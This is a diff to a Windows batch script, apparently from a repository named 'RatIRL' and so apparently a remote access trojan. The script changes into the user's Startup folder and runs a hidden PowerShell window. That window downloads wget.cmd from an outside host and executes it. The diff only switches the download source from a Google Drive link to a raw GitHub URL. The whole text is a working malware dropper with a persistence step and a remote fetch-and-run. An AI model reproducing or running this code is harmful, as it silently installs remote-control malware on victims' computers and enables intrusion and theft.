@@ -6,7 +6,7 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 
 cd "%STARTUP%"
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://drive.google.com/file/d/1uSz1ypRtIMx0nZuy4VhFI4fCulHKLYwE/view?usp=sharing -OutFile wget.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/vadill0/RatIRL/main/Files/wget.cmd -OutFile wget.cmd"
 
 powershell ./wget.cmd
 
